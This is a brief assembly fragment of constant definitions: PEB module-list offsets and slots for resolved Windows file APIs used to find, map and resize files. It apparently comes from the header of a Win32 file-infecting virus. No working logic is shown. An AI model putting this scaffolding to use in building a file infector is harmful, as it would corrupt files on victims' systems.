PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE equ     8
PEB_LDR_DATA                         equ     0ch
InLoadOrderModuleList                equ     0ch

IMAGE_OHDD32_LOAD_CONFIG_TABLE       equ     0c8h

esMapViewOfFile                      equ     dword ptr [esi + 4]
esFindNextFileA                      equ     dword ptr [esi + 8]
esFindFirstFileA                     equ     dword ptr [esi + 0ch]
esCreateFileMappingA                 equ     dword ptr [esi + 10h]
esCreateFileA                        equ     dword ptr [esi + 14h]
esUnmapViewOfFile                    equ     dword ptr [esi + 18h]
esSetFilePointer                     equ     dword ptr [esi + 20h]
esSetEndOfFile                       equ     dword ptr [esi + 1ch]

V                                    equ     offset message - 400000h